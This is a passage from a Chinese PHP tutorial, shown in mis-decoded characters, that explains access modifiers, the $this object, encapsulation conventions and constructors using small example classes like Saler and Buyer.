ä¹‰ç±»å†…éƒ¨è®¿é—®</li></ul></li><li>å±æ€§å¿…é¡»æœ‰è®¿é—®ä¿®é¥°é™å®šç¬¦ï¼Œæ–¹æ³•å¯ä»¥æ²¡æœ‰è®¿é—®ä¿®é¥°é™å®šç¬¦ï¼ˆé»˜è®¤publicï¼‰</li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€å£°æ˜ç±»ç»“æ„</p><p>2ã€ç¡®å®šç±»æˆå‘˜</p><p>3ã€ç¡®å®šç±»æˆå‘˜çš„è®¿é—®ä½ç½®é™å®šï¼Œä½¿ç”¨å¯¹åº”è®¿é—®ä¿®é¥°é™å®šç¬¦</p><p>4ã€åªèƒ½åœ¨å¯¹åº”ä½ç½®è®¿é—®è¢«ä¿®é¥°çš„æˆå‘˜</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€å…¬æœ‰æˆå‘˜è®¿é—®</p><pre><code>class Saler{    # å±æ€§    public $count = 100;    # æ–¹æ³•    public function getCount(){        echo __METHOD__;        # é­”æœ¯å¸¸é‡ï¼Œæ˜¾ç¤ºå½“å‰æ–¹æ³•åï¼ˆåŒ…å«ç±»åï¼‰    }    function setCount(){        echo __METHOD__;    }}# å®ä¾‹åŒ–å¯¹è±¡$s = new Saler();# è®¿é—®ï¼ˆç±»å¤–ï¼‰echo $s-&gt;count;$s-&gt;getCount();$s-&gt;setCount();</code></pre><p>2ã€å—ä¿æŠ¤å’Œç§æœ‰æˆå‘˜è®¾å®šï¼ˆå½“å‰å—ä¿æŠ¤å’Œç§æœ‰ä¸€è‡´ï¼Œéœ€è¦é«˜é˜¶çŸ¥è¯†æ‰ä¼šæœ‰åŒºåˆ«ï¼‰</p><pre><code>class Buyer{    # å±æ€§    protected $money = 10;    private $account = &apos;6226000000000001&apos;;    # æ–¹æ³•    protected function getMoney(){        echo __METHOD__;    }    private function getAccount(){        echo __METHOD__;    }}# å®ä¾‹åŒ–$b = new Buyer();echo $b-&gt;money;        # é”™è¯¯ï¼šå½“å‰å±äºç±»å¤–éƒ¨ï¼Œä¸èƒ½è®¿é—®echo $b-&gt;account;    # é”™è¯¯ï¼šå½“å‰å±äºç±»å¤–éƒ¨ï¼Œä¸èƒ½è®¿é—®$b-&gt;getMoney();        # é”™è¯¯ï¼šå½“å‰å±äºç±»å¤–éƒ¨ï¼Œä¸èƒ½è®¿é—®$b-&gt;getAccount();    # é”™è¯¯ï¼šå½“å‰å±äºç±»å¤–éƒ¨ï¼Œä¸èƒ½è®¿é—®</code></pre><blockquote><p><strong>æ€»ç»“</strong></p></blockquote><p>1ã€è®¿é—®ä¿®é¥°é™å®šç¬¦åˆ†ä¸ºä¸‰ç§ï¼špublicã€protectedå’Œprivateï¼Œè®¿é—®æƒé™ä¾æ¬¡é™ä½ï¼ˆç±»å¯¹æˆå‘˜æ§åˆ¶æƒé™ä¾æ¬¡å¢åŠ ï¼‰</p><p>2ã€è®¿é—®ä¿®é¥°é™å®šç¬¦é™å®šçš„æ˜¯æˆå‘˜åˆ°åº•åœ¨å“ªé‡Œèƒ½è¢«è®¿é—®ï¼Œç§æœ‰å’Œå—ä¿æŠ¤éƒ½åªèƒ½åœ¨ç±»å†…éƒ¨è®¿é—®ï¼Œå…¬æœ‰å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è®¿é—®ï¼ˆä½†éƒ½å¿…é¡»æ˜¯å¯¹è±¡å»è®¿é—®ï¼‰</p><p>3ã€å±æ€§å¿…é¡»å†™æ¸…æ¥šè®¿é—®ä¿®é¥°é™å®šç¬¦ï¼Œæ–¹æ³•å¯ä»¥çœå»ï¼ˆä¸å»ºè®®ï¼‰ï¼Œå› ä¸ºç³»ç»Ÿé»˜è®¤æ˜¯public</p><h3 id="5ã€ç±»å†…éƒ¨å¯¹è±¡"><a href="#5ã€ç±»å†…éƒ¨å¯¹è±¡" class="headerlink" title="5ã€ç±»å†…éƒ¨å¯¹è±¡"></a><strong>5ã€ç±»å†…éƒ¨å¯¹è±¡</strong></h3><blockquote><p>ç›®æ ‡ï¼šç†è§£å†…éƒ¨å¯¹è±¡çš„æ¦‚å¿µï¼ŒæŒæ¡å†…éƒ¨å¯¹è±¡å¯¹æˆå‘˜çš„è®¿é—®</p></blockquote><blockquote><p><strong>æ¦‚å¿µ</strong></p></blockquote><p><strong>å†…éƒ¨å¯¹è±¡</strong>ï¼š$thisï¼Œ<strong>æ–¹æ³•å†…éƒ¨</strong>å†…ç½®çš„ä¸€ä¸ªå¯¹è±¡ï¼Œä¼šè‡ªåŠ¨æŒ‡å‘æ¥è°ƒç”¨æ–¹æ³•çš„å¯¹è±¡</p><ul><li>$thiså­˜åœ¨äºæ–¹æ³•å†…éƒ¨ï¼ˆä»…é™å†…éƒ¨ä½¿ç”¨ï¼‰ï¼Œæ‰€ä»¥ç›¸å½“äºåœ¨ç±»çš„ç»“æ„å†…éƒ¨<ul><li>å¯ä»¥è®¿é—®ä»»æ„è®¿é—®ä¿®é¥°é™å®šç¬¦ä¿®é¥°çš„æˆå‘˜</li><li>ç§æœ‰æˆå‘˜éƒ½æ˜¯é€šè¿‡å…¬æœ‰æ–¹æ³•æ¥å®ç°è®¿é—®ï¼ˆå…¬æœ‰æ–¹æ³•å¯ä»¥åœ¨ç±»å¤–éƒ¨è®¿é—®ï¼‰</li></ul></li><li>ç±»å†…éƒ¨å¯¹ç±»æˆå‘˜çš„è®¿é—®ä¹Ÿéœ€è¦é€šè¿‡å¯¹è±¡æ‰èƒ½è®¿é—®ï¼Œæ‰€ä»¥å¿…é¡»é€šè¿‡$thiså†…éƒ¨å¯¹è±¡è®¿é—®ç±»æˆå‘˜</li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€å£°æ˜ç±»ç»“æ„</p><p>2ã€æ˜ç¡®ç§æœ‰æˆå‘˜ï¼ˆä¸é™å®šæˆå‘˜çš„è®¿é—®ä¿®é¥°é™å®šç¬¦ï¼‰</p><p>3ã€ç§æœ‰æˆå‘˜éœ€è¦åœ¨æŸç§æƒ…å†µä¸‹è¢«è®¿é—®ï¼šå¢åŠ æ–¹æ³•ï¼Œåœ¨æ–¹æ³•é‡Œä½¿ç”¨$thisè®¿é—®</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€å°è¯•åœ¨ç±»å†…éƒ¨æ–¹æ³•ä¸­è®¿é—®å±æ€§</p><pre><code>class Saler{      # å±æ€§      public $count = 100;      protected $discount = 0.8;      private $money = 100;    public function getAll(){        echo $count,$discount,$money;    # å…¨éƒ¨é”™è¯¯ï¼šæç¤ºæœªå®šä¹‰çš„â€œå˜é‡â€    }                    }$s = new Saler();$s-&gt;getAll();</code></pre><p><strong>æ³¨æ„</strong>ï¼šæ–¹æ³•æœ¬è´¨æ˜¯å®šä¹‰åœ¨ç±»å†…éƒ¨çš„å‡½æ•°ï¼Œå› æ­¤å—åˆ¶äºä½œç”¨åŸŸçš„é—®é¢˜ï¼Œåœ¨æ–¹æ³•å†…éƒ¨è®¿é—®çš„å˜é‡ç³»ç»Ÿè®¤å®šä¸ºå±€éƒ¨å˜é‡ï¼ˆå¿…é¡»å†…éƒ¨å®šä¹‰æˆ–è€…å‚æ•°ä¼ å…¥ï¼‰ï¼Œå¦åˆ™å°±ä¼šæç¤ºæœªå®šä¹‰</p><p>2ã€ç±»å†…éƒ¨è®¿é—®ç±»æˆå‘˜ï¼Œéœ€è¦é€šè¿‡å¯¹è±¡æ¥è¿›è¡Œè®¿é—®</p><pre><code>class Saler{      # å±æ€§      public $count = 100;      protected $discount = 0.8;      private $money = 100;    public function getAll(){        # éœ€è¦è·å–åˆ°å¯¹è±¡åå­—ï¼šå› ä¸ºæ–¹æ³•æœ¬èº«å°±æ˜¯å‡½æ•°ï¼Œè®¿é—®å¤–éƒ¨å…¨å±€å˜é‡å¯ä»¥é€šè¿‡globalå¼•å…¥å®ç°        global $s;        echo $s-&gt;count,$s-&gt;discount,$s-&gt;money;        #æ­£ç¡®è¾“å‡º    }                    }$s = new Saler();$s-&gt;getAll();</code></pre><p><strong>æ³¨æ„</strong>ï¼šä¸Šè¿°ä»£ç è§„å®šæ­»äº†ä»¥åå¯¹è±¡åªèƒ½æ˜¯$sï¼Œä¸èƒ½æœ‰å…¶ä»–å¯¹è±¡æˆ–è€…å…¶ä»–å‘½åï¼Œæ‰€ä»¥éå¸¸ä¸å‹å¥½</p><p>3ã€ä½¿ç”¨å†…ç½®å¯¹è±¡$thisè®¿é—®</p><pre><code>class Saler{      # å±æ€§      public $count = 100;      protected $discount = 0.8;      private $money = 100;    public function getAll(){        var_dump($this);        echo $this-&gt;count,$this-&gt;discount,$this-&gt;money;        #æ­£ç¡®è¾“å‡º    }                    }$s = new Saler();$s-&gt;getAll();</code></pre><p><strong>æ³¨æ„</strong>ï¼š$thisä»£è¡¨çš„æ˜¯å¯¹è±¡ï¼Œè€Œ$thisæ‰€åœ¨ç¯å¢ƒä¸ºç±»å†…éƒ¨çš„æ–¹æ³•å†…éƒ¨ï¼Œæ‰€ä»¥$thiså¯¹è±¡æ˜¯åœ¨ç±»å†…éƒ¨è®¿é—®ï¼Œå› æ­¤å¯ä»¥è®¿é—®æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼Œä¸å—è®¿é—®ä¿®é¥°é™å®šç¬¦é™åˆ¶</p><blockquote><p>$thisã€classå’Œnewä¹‹é—´çš„å…³ç³»åŸç†</p></blockquote><ul><li><p>classæ˜¯å®šä¹‰ç±»ç»“æ„ï¼Œå±äºéæ‰§è¡Œæ®µä»£ç ï¼Œå› æ­¤ä¼šè¢«åŠ è½½åˆ°ä»£ç æ®µï¼ˆç¼–è¯‘é˜¶æ®µï¼‰</p></li><li><p>newæ˜¯å®ä¾‹åŒ–å¯¹è±¡ï¼Œå…ˆåˆ¤å®šç±»åœ¨å†…å­˜ï¼ˆä»£ç æ®µï¼‰æ˜¯å¦å­˜åœ¨</p><ul><li>ç±»ä¸å­˜åœ¨ï¼ŒæŠ¥é”™ï¼›</li><li>ç±»å­˜åœ¨ï¼Œå°†ç±»å†…éƒ¨çš„å±æ€§éƒ¨åˆ†å¤åˆ¶ä¸€ä»½ï¼Œç„¶ååœ¨å†…å­˜ï¼ˆå †åŒºï¼‰å¼€è¾Ÿä¸€å—å†…å­˜ç©ºé—´ï¼Œå°†å±æ€§æ”¾åˆ°é‡Œé¢ï¼ŒåŒæ—¶å†…éƒ¨æœ‰ä¸€ä¸ª<strong>æŒ‡é’ˆ</strong>æŒ‡å‘ç±»çš„å†…å­˜ç©ºé—´ï¼ˆä»£ç æ®µï¼‰</li><li>å¯¹è±¡è®¿é—®å±æ€§å³è®¿é—®çš„æ˜¯å¯¹è±¡ç©ºé—´é‡Œå­˜å‚¨çš„éƒ¨åˆ†</li><li>å¯¹è±¡è®¿é—®æ–¹æ³•æ˜¯å¯¹è±¡é€šè¿‡<strong>å†…éƒ¨æŒ‡é’ˆ</strong>æ‰¾åˆ°ç±»ç©ºé—´ä¸­çš„æ–¹æ³•ï¼Œç„¶ååœ¨å†…å­˜ï¼ˆæ ˆåŒºï¼‰å¼€è¾Ÿè¿è¡Œ</li></ul></li><li><p>$thisæ˜¯ç³»ç»Ÿåœ¨æ–¹æ³•å†…ç½®çš„å¯¹è±¡é€šç”¨åå­—</p><ul><li>å¯¹è±¡åœ¨è°ƒç”¨æ–¹æ³•çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æ‰¾åˆ°å¯¹è±¡æ‰€ä¿å­˜çš„å†…å­˜åœ°å€ï¼ˆå †åŒºï¼‰ï¼Œç„¶åæŠŠåœ°å€èµ‹å€¼ç»™$this</li></ul></li><li><p>æ–¹æ³•å†…éƒ¨çš„$thiså°±ä»£è¡¨è°ƒç”¨å½“å‰$thisæ‰€åœ¨æ–¹æ³•çš„å¤–éƒ¨å¯¹è±¡</p><ul><li>$thisçš„æœ¬è´¨æ˜¯å‡½æ•°å†…éƒ¨çš„ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œåªæ˜¯ç³»ç»Ÿè‡ªåŠ¨å¯¹å…¶è¿›è¡Œèµ‹å€¼ï¼Œè€Œä¸”ä¸€å®šæ˜¯è°ƒç”¨æ–¹æ³•çš„å¯¹è±¡æœ¬èº«</li></ul></li><li>é¢å‘å¯¹è±¡ç¼–ç¨‹ä»£ç è¿è¡Œå†…å­˜å…³ç³»</li></ul><p>[å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æ¥ä¸Šä¼ (img-vRLjf8Y3-1586427577961)(æ•ˆæœå›¾\é¢å‘å¯¹è±¡ç¼–ç¨‹ä»£ç è¿è¡Œå†…å­˜å…³ç³».gif)]</p><blockquote><p><strong>å°ç»“</strong></p></blockquote><p>1ã€ç±»å†…éƒ¨æ–¹æ³•å†…æœ‰ä¸€ä¸ªå†…ç½®å¯¹è±¡$thisï¼Œä»£è¡¨è®¿é—®è¯¥æ–¹æ³•çš„å¤–éƒ¨å¯¹è±¡</p><p>2ã€ç±»åœ¨å®ä¾‹åŒ–å¯¹è±¡çš„æ—¶å€™è¦ä¿è¯å†…å­˜ä¸­æœ‰è¯¥ç±»</p><p>3ã€ä¸€ä¸ªç±»å¯ä»¥å®ä¾‹åŒ–å¤šä¸ªå¯¹è±¡ï¼Œæ¯ä¸ªå¯¹è±¡è®¿é—®æˆå‘˜æ–¹æ³•æ—¶ï¼Œ$thiså°±ä»£è¡¨å¯¹åº”å¯¹è±¡</p><h3 id="6ã€é¢å‘å¯¹è±¡å¼€å‘è§„èŒƒ"><a href="#6ã€é¢å‘å¯¹è±¡å¼€å‘è§„èŒƒ" class="headerlink" title="6ã€é¢å‘å¯¹è±¡å¼€å‘è§„èŒƒ"></a><strong>6ã€é¢å‘å¯¹è±¡å¼€å‘è§„èŒƒ</strong></h3><blockquote><p>ç›®æ ‡ï¼šäº†è§£é¢å‘å¯¹è±¡çš„åŸºæœ¬å¼€å‘è§„èŒƒï¼Œç†Ÿç»ƒè¿ç”¨å¼€å‘è§„èŒƒå®ç°é¡¹ç›®å¼€å‘</p></blockquote><blockquote><p><strong>æ¦‚å¿µ</strong></p></blockquote><p><strong>å¼€å‘è§„èŒƒ</strong>ï¼šå¼€å‘è€…çº¦å®šä¿—æˆçš„å¼€å‘è®¾è®¡æ–¹å¼</p><ul><li>å±æ€§çš„åˆå§‹åŒ–<ul><li>å±æ€§æ˜¯ç±»å¯¹äºåŒç±»äº‹åŠ¡æ‰€æŠ½ç¦»å‡ºæ¥çš„å…±æ€§<code>æ•°æ®</code>ï¼Œæœ¬èº«åœ¨ç±»ç»“æ„ä¸­æ²¡æœ‰ä»·å€¼ï¼Œæ˜¯å½“å…·ä½“å¯¹è±¡äº§ç”Ÿä¹‹åï¼Œå±äºå¯¹è±¡æœ¬èº«çš„</li><li>è¿›è¡Œç±»ä¸­å®šä¹‰å±æ€§çš„æ—¶å€™ï¼Œé€šå¸¸ä¸ä¼šå¯¹å±æ€§è¿›è¡Œåˆå§‹åŒ–ï¼Œé™¤éå±æ€§æœ¬èº«çš„å€¼ä¹Ÿå…·æœ‰å…±æ€§</li><li>å±æ€§å¦‚æœæ²¡æœ‰åˆå§‹åŒ–æ•°æ®ï¼Œé‚£ä¹ˆåœ¨äº§ç”Ÿå¯¹è±¡ååº”è¯¥å¯¹å±æ€§å®Œæˆåˆå§‹åŒ–ï¼ˆæœ‰çš„å±æ€§æ˜¯åœ¨æ“ä½œè¿‡ç¨‹ä¸­è¢«åˆå§‹åŒ–ï¼‰</li></ul></li><li>è®¿é—®ä¿®é¥°é™å®šç¬¦é€‰æ‹©ï¼šè®¿é—®ä¿®é¥°é™å®šç¬¦æ˜¯ç”¨æ¥é™åˆ¶ç±»æˆå‘˜è¢«å¯¹è±¡è®¿é—®æ—¶å¯¹è±¡æ‰€å¤„ä½ç½®çš„ã€‚è®¿é—®çš„æƒé™ä»publicã€protectedåˆ°privateä¾æ¬¡å˜å°ï¼ˆç±»å¯¹æˆå‘˜çš„æ§åˆ¶æƒé™ä¾æ¬¡å˜å¤§ï¼‰<ul><li>è®¾å®šå¥½çš„ç±»æˆå‘˜æœ¬èº«ä¸ä¼šè¢«å¤–éƒ¨ç”¨åˆ°ï¼Œé‚£ä¹ˆåº”è¯¥ä½¿ç”¨privateæˆ–è€…protected</li><li>è®¾å®šå¥½çš„ç±»æˆå‘˜ä¸€å®šä¼šç»™å¤–éƒ¨è®¿é—®ï¼Œä½¿ç”¨public</li><li>å±æ€§é€šå¸¸privateå±…å¤šï¼Œå¦‚æœéœ€è¦å¤–éƒ¨è®¿é—®å±æ€§ï¼Œé€šå¸¸ä¼šå®šä¹‰ç›¸å…³æ–¹æ³•æ¥å®ç°å±æ€§çš„æŸ¥çœ‹å’Œä¿®æ”¹ï¼Œå› ä¸ºå¯ä»¥åœ¨æ–¹æ³•å†…å¯¹æ•°æ®é€»è¾‘è¿›è¡Œä»£ç æ§åˆ¶ï¼Œå®‰å…¨</li><li>å°½å¯èƒ½å¢åŠ ç±»å¯¹æˆå‘˜çš„æ§åˆ¶ï¼ˆå°½å¯èƒ½å¤šä½¿ç”¨privateï¼Œå°‘ä½¿ç”¨publicï¼‰</li></ul></li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€å±æ€§åˆå§‹åŒ–</p><pre><code>class Saler{      # å±æ€§      public $count;                    # æŸä¸ªå–å®¶æ‹¥æœ‰çš„å•†å“æ•°é‡ï¼Œæ¯ä½å…·ä½“å–å®¶å¯¹è±¡æ‹¥æœ‰çš„ä¸å¯èƒ½ä¸€æ ·ï¼Œæ‰€ä»¥æ²¡å¿…è¦åˆå§‹åŒ–      protected $discount;    # æŸä¸ªå–å®¶é’ˆå¯¹é”€å”®çš„æŠ˜æ‰£ï¼ŒåŒæ ·æ²¡æœ‰ç»Ÿä¸€çš„ä»·å€¼      private $money = 0;    # æŸä¸ªå–å®¶çš„è´¦æˆ·ä½™é¢ï¼Œä»»ä½•ä¸€ä½å–å®¶ä¸€å¼€å§‹åšç”Ÿæ„çš„æ—¶å€™ï¼Œè´¦æˆ·ä½™é¢éƒ½ä¸º0ï¼Œæ‰€ä»¥å¯ä»¥åˆå§‹åŒ–    # ä¸šåŠ¡åˆå§‹åŒ–å±æ€§    public function setDiscount($discount = 1){        # å¯ä»¥è¿›è¡Œé€»è¾‘æ§åˆ¶        $this-&gt;discount = $discount;    }}# å®ä¾‹åŒ–å¯¹è±¡ï¼Œåˆå§‹åŒ–å±æ€§$s = new Saler();$s-&gt;count = 100;# æ‰“æŠ˜ä¿ƒé”€ï¼šä¸šåŠ¡åˆå§‹åŒ–$s-&gt;setDiscount(0.8);</code></pre><p>2ã€è®¿é—®ä¿®é¥°é™å®šç¬¦é€‰æ‹©</p><pre><code>class Saler{      # å±æ€§      public $count;                      private $money = 0;    # å¢åŠ æ–¹æ³•æ“ä½œç§æœ‰å±æ€§money    public function getMoney(){        return $this-&gt;money;    }    public function setMoney($money){        # å¯ä»¥å¯¹é€»è¾‘è¿›è¡Œä¿®æ”¹ï¼Œå¯¹æ•°æ®è¿›è¡Œå®‰å…¨åˆ¤å®šï¼Œä¿è¯æ•°æ®çš„å®‰å…¨æ€§        $this-&gt;money = $money;        # $this-&gt;moneyæ˜¯å±æ€§ï¼Œ$moneyæ˜¯å¤–éƒ¨ä¼ å…¥çš„å‚æ•°ï¼ŒäºŒè€…åŒåä½†æ˜¯æ€§è´¨å®Œå…¨ä¸åŒ    }}  </code></pre><blockquote><p><strong>å°ç»“</strong></p></blockquote><p>1ã€å±æ€§åœ¨ç±»ä¸­å®šä¹‰çš„æ—¶å€™ï¼Œé€šå¸¸ä¸ä¼šåˆå§‹åŒ–å€¼ï¼Œé™¤éæ‰€æœ‰ç±»å®ä¾‹åŒ–å¾—åˆ°çš„å¯¹è±¡çš„æŸä¸ªå±æ€§éœ€è¦æ˜¯ç»Ÿä¸€å€¼</p><p>2ã€åº”è¯¥å°½å¯èƒ½å¢åŠ ç±»å¯¹æˆå‘˜çš„æ§åˆ¶ï¼Œå³ä½¿ç”¨èŒƒå›´è¾ƒå°çš„è®¿é—®ä¿®é¥°é™å®šç¬¦ä¼˜å…ˆ</p><p>3ã€å±æ€§é€šå¸¸æ˜¯ç§æœ‰åŒ–çš„ï¼Œä¸€èˆ¬æ˜¯é€šè¿‡è®¾å®šæ–¹æ³•æ¥å®ç°å±æ€§çš„è®¿é—®å’Œä¿®æ”¹</p><h3 id="7ã€æ„é€ æ–¹æ³•"><a href="#7ã€æ„é€ æ–¹æ³•" class="headerlink" title="7ã€æ„é€ æ–¹æ³•"></a><strong>7ã€æ„é€ æ–¹æ³•</strong></h3><blockquote><p>ç›®æ ‡ï¼šäº†è§£<strong>é­”æœ¯æ–¹æ³•</strong>çš„æ¦‚å¿µï¼ŒæŒæ¡æ„é€ æ–¹æ³•çš„ä½œç”¨ï¼Œæ˜ç¡®æ„é€ æ–¹æ³•çš„è§¦å‘æ¨¡å¼</p></blockquote><blockquote><p><strong>æ¦‚å¿µ</strong></p></blockquote><p><strong>æ„é€ æ–¹æ³•</strong>ï¼š__construct()ï¼Œæ˜¯ä¸€ç§ç±»ç»“æ„ç‰¹æœ‰çš„ç‰¹æ®Šæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”±ç³»ç»Ÿè§„å®šå¥½ï¼Œå¼€å‘äººå‘˜åœ¨å®šä¹‰çš„æ—¶å€™åªéœ€è¦<strong>æŠ„</strong>ä¸€éï¼Œæœ‰äº†æ„é€ æ–¹æ³•çš„ç±»åœ¨å®ä¾‹åŒ–å¯¹è±¡ä¹‹åï¼Œå¯¹è±¡å°±ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚</p><ul><li>æ„é€ æ–¹æ³•æ˜¯ä¸€ç§é­”æœ¯æ–¹æ³•ï¼š<strong>é­”æœ¯æ–¹æ³•</strong>æ˜¯ä¼šè‡ªåŠ¨è¢«è§¦å‘ï¼Œä¸éœ€è¦æ‰‹åŠ¨è°ƒç”¨çš„æ–¹æ³•</li><li>æ„é€ æ–¹æ³•çš„ç›®æ ‡æ˜¯ä¸ºäº†å®ç°å¯¹è±¡çš„åˆå§‹åŒ–<ul><li>å¯¹è±¡å®ä¾‹åŒ–ä¹‹åä¼šè‡ªåŠ¨è°ƒç”¨</li><li>æ„é€ æ–¹æ³•é€šå¸¸æ˜¯ä¸ºäº†å®ç°å¯¹è±¡æ‰€éœ€èµ„æºçš„åˆå§‹åŒ–ï¼ˆå±æ€§ã€èµ„æºï¼‰</li></ul></li><li>æ„é€ æ–¹æ³•è™½ç„¶ä¸ºé­”æœ¯æ–¹æ³•ï¼Œä½†æœ¬è´¨ä¾ç„¶æ˜¯ä¸€ä¸ªæ–¹æ³•<ul><li>å—è®¿é—®ä¿®é¥°é™å®šç¬¦æ§åˆ¶ï¼ˆå¯¹è±¡çš„äº§ç”Ÿä½ç½®ä¼šå‘ç”Ÿæ”¹å˜ï¼‰</li><li>å¯¹è±¡å¯ä»¥é€‰æ‹©è°ƒç”¨ï¼ˆä¸€èˆ¬ä¸ä¼šï¼‰</li></ul></li><li>æ„é€ æ–¹æ³•å¯ä»¥è®¾å®šå½¢å‚ï¼Œå½¢å‚å¯¹åº”çš„å®å‚æ˜¯åœ¨å®ä¾‹åŒ–å¯¹è±¡çš„æ—¶å€™ä¼ å…¥ï¼šnew ç±»å(å®å‚ä¼ é€’ç»™å½¢å‚)</li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€ç¡®å®šç±»ä¸­éœ€è¦æœ‰æ•°æ®å®ç°åˆå§‹åŒ–ï¼Œè€Œä¸”æ˜¯çµæ´»å¤„ç†ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½ä¸ä¸€æ ·çš„ï¼šä½¿ç”¨æ„é€ æ–¹æ³•</p><p>2ã€ç¡®å®šåˆå§‹åŒ–çš„æ•°æ®éœ€è¦å¤–éƒ¨ä¼ å…¥ï¼šä½¿ç”¨æ„é€ æ–¹æ³•è®¾å®šå½¢å‚</p><p>3ã€åœ¨æ„é€ æ–¹æ³•å†…éƒ¨åˆ©ç”¨å†…éƒ¨å¯¹è±¡å®ç°åˆå§‹åŒ–éœ€æ±‚</p><ul><li>å±æ€§åˆå§‹åŒ–</li><li>èµ„æºåˆå§‹åŒ–</li><li>å…¶ä»–å†…ç½®æ–¹æ³•è°ƒç”¨</li></ul><p>4ã€å®ä¾‹åŒ–å¯¹è±¡æ—¶å¿…é¡»ä¼ å…¥æ„é€ æ–¹æ³•æ‰€éœ€æ•°æ®</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€æ„é€ æ–¹æ³•å®ç°ï¼šåœ¨ç±»ä¸­å¢åŠ ä¸€ä¸ªæ–¹æ³•__construct()å³å¯</p><pre><code>class Saler{    # æ„é€ æ–¹æ³•    public function __construct(){        echo __CLASS__;    }}</code></pre><p>2ã€æ„é€ æ–¹æ³•ä¹Ÿæ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œä¸æ™®é€šçš„åœ°æ–¹åœ¨äºï¼Œç±»å®ä¾‹åŒ–å¾—åˆ°çš„å¯¹è±¡ä¼šé©¬ä¸Šè‡ªåŠ¨è°ƒç”¨</p><pre><code># å®ä¾‹åŒ–new Saler();                # è¾“å‡ºSaler</code></pre><p>3ã€æ„é€ æ–¹æ³•çš„æ„ä¹‰ï¼šæ„é€ æ–¹æ³•æ˜¯å¯¹è±¡å®ä¾‹åŒ–çš„æ—¶å€™ç”¨æ¥åˆå§‹åŒ–å¯¹è±¡çš„èµ„æºçš„ï¼Œæ‰€ä»¥é€šå¸¸æ˜¯ç”¨æ¥åˆå§‹åŒ–å¯¹è±¡çš„å±æ€§æˆ–è€…å…¶ä»–èµ„æºåˆå§‹åŒ–</p><pre><code>class Saler{      # å±æ€§      public $count;                      private $money;    # æ„é€ æ–¹æ³•ï¼šåˆå§‹åŒ–å±æ€§    public function __construct(){        $this-&gt;count = 100;        $this-&gt;money = 100;    }}</code></pre><p>5ã€å¦‚æœå±æ€§çš„æ•°æ®åœ¨æ„é€ æ–¹æ³•ä¸­åˆå§‹åŒ–æ˜¯å›ºå®šå†™æ­»çš„ï¼Œé‚£ä¹ˆä¸ç›´æ¥åœ¨å®šä¹‰ç±»çš„æ—¶å€™åˆå§‹åŒ–å±æ€§ä¸€æ ·ã€‚æ„å‘³ç€æ•°æ®æ²¡æœ‰ä»»ä½•ä»·å€¼ï¼ˆæ‰€æœ‰å¯¹è±¡éƒ½ç›¸åŒï¼‰ï¼Œå› æ­¤é€šå¸¸æ˜¯é€šè¿‡æ„é€ æ–¹æ³•çš„å‚æ•°æ¥å®ç°æ•°æ®çš„å¤–éƒ¨ä¼ å…¥</p><pre><code>class Saler{      # å±æ€§      public $count;                      private $money;    # æ„é€ æ–¹æ³•ï¼šåˆå§‹åŒ–å±æ€§    public function __construct($count,$money){        $this-&gt;count = $count;        $this-&gt;money = $money;    }}</code></pre><p>5ã€ä¸€æ—¦æ„é€ æ–¹æ³•æ‹¥æœ‰äº†å½¢å‚ï¼Œé‚£ä¹ˆå¯¹è±¡åœ¨è°ƒç”¨è¯¥æ–¹æ³•çš„æ—¶å€™å°±éœ€è¦ä¼ å…¥å¯¹åº”çš„å®å‚ï¼Œè€Œæ„é€ æ–¹æ³•åˆæ˜¯è‡ªåŠ¨è°ƒç”¨çš„ï¼Œæ‰€ä»¥éœ€è¦åœ¨å®ä¾‹åŒ–å¯¹è±¡çš„æ—¶å€™ä½¿ç”¨new ç±»å(æ„é€ æ–¹æ³•å¯¹åº”çš„å®å‚åˆ—è¡¨)æ¥å®ç°</p><pre><code># å®ä¾‹åŒ–å¯¹è±¡$s1 = new Saler(100,100);$s2 = new Saler(1000,1000);$s3 = new Saler;            # é”™è¯¯ï¼šå› ä¸ºæ­¤æ—¶ç±»æœ‰æ„é€ æ–¹æ³•ä¸”è¦æ±‚ä¼ å…¥å‚æ•°ï¼Œæ‰€ä»¥å¿…é¡»ä½¿ç”¨ï¼ˆï¼‰å¹¶ä¼ å…¥æ•°æ®</code></pre><p><strong>æ³¨æ„</strong>ï¼šä¹‹å‰æ‰€è¯´çš„<code>new ç±»å</code> å’Œ<code>new ç±»å()</code>æ²¡æœ‰åŒºåˆ«æ˜¯å› ä¸ºæ²¡æœ‰æ„é€ æ–¹æ³•ï¼Œæˆ–è€…æ„é€ æ–¹æ³•æ²¡æœ‰å‚æ•°é™å®šï¼Œä¸€æ—¦æ„é€ æ–¹æ³•æœ‰äº†å‚æ•°ï¼Œé‚£ä¹ˆ<code>new ç±»å</code> å°±ä¸èƒ½ç›´æ¥ä½¿ç”¨äº†ã€‚</p><p>6ã€æ„é€ æ–¹æ³•ä¸ç®¡å†æ€ä¹ˆç‰¹æ®Šï¼Œä¹Ÿæ˜¯ç”¨æˆ·å®šä¹‰çš„æ–¹æ³•ï¼Œè¨€å¤–ä¹‹æ„é™¤äº†åœ¨å®ä¾‹åŒ–å¯¹è±¡æ—¶å¯¹è±¡ä¼šè‡ªåŠ¨è°ƒç”¨ä¹‹å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰‹åŠ¨è°ƒç”¨æ„é€ æ–¹æ³•ï¼ˆä½†æ˜¯ä¸€èˆ¬æ²¡æœ‰ä»·å€¼ï¼Œå› ä¸ºå¯¹è±¡å®ä¾‹åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ï¼‰</p><pre><code>class Saler{      # å±æ€§      public $count;                      private $money;    